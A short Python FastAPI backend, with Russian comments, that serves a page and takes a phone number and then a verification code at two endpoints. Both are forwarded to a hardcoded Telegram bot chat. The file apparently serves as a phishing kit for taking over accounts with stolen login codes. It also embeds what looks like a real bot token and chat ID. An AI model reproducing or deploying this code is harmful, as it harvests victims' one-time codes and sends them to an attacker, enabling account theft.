from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
import requests

TOKEN = "7727159857:AAGiSQ9461I-bi5UKEFERHSZns5MBnqQrt0"  # Заменить на токен бота
CHAT_ID = "5561336076"  # Заменить на свой Telegram ID

app = FastAPI()

class PhoneNumber(BaseModel):
    phone: str

class Code(BaseModel):
    phone: str
    code: str

def send_telegram_message(text: str):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": text}
    requests.post(url, data=data)

@app.post("/send_phone")
def send_phone(data: PhoneNumber):
    send_telegram_message(f"Новый номер: {data.phone}")
    return {"message": "Номер отправлен"}

@app.post("/send_code")
def send_code(data: Code):
    send_telegram_message(f"Код для {data.phone}: {data.code}")
    return {"message": "Код отправлен"}

from fastapi.responses import FileResponse

@app.get("/")
def read_root():
    return FileResponse("index.html")
